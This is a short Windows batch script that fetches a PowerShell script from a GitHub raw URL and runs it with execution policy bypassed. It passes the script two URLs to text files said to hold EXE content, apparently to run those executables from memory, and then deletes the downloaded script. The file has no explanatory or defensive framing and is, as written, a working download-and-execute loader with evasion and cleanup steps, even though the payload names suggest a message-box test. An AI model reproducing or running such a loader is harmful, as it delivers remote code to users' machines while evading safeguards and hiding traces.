@echo off
REM Define the URL of the PowerShell script
set PS_SCRIPT_URL=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/RunApps.ps1

REM Define URLs for the EXEs (text files with EXE content)
set U1=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest1.txt
set U2=https://github.com/xxuavails/TestMessage/raw/refs/heads/main/Messageboxtest2.txt

REM Download the PowerShell script from the specified URL
powershell -Command "Invoke-WebRequest -Uri '%PS_SCRIPT_URL%' -OutFile '%TEMP%\run_exe_from_memory.ps1'"

REM Execute the downloaded PowerShell script with the URLs as arguments
powershell -ExecutionPolicy Bypass -File "%TEMP%\run_exe_from_memory.ps1" "%U1%" "%U2%"

REM Clean up by removing the downloaded script
del "%TEMP%\run_exe_from_memory.ps1"

exit
